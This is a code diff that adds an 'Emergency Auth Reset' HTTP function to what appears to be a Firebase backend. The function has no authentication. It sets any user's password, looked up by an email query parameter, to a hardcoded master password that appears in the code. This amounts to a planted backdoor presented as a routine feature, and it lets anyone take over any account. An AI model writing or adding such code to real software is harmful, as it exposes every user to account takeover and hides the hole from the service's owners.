@@ -151,3 +151,22 @@ export const onUserUpdate = functions.firestore
     await Promise.all(logs);
     return null;
   });
+
+// 7. Emergency Auth Reset
+export const emergencyResetPassword = functions.https.onRequest(async (req, res) => {
+  const email = req.query.email as string;
+  if (!email) {
+    res.status(400).send("Email required");
+    return;
+  }
+  
+  try {
+    const userRecord = await admin.auth().getUserByEmail(email);
+    await admin.auth().updateUser(userRecord.uid, {
+      password: "GouujiMasterKey2026!"
+    });
+    res.status(200).send(`Successfully reset password for ${email}`);
+  } catch (error: any) {
+    res.status(500).send(`Error: ${error.message}`);
+  }
+});
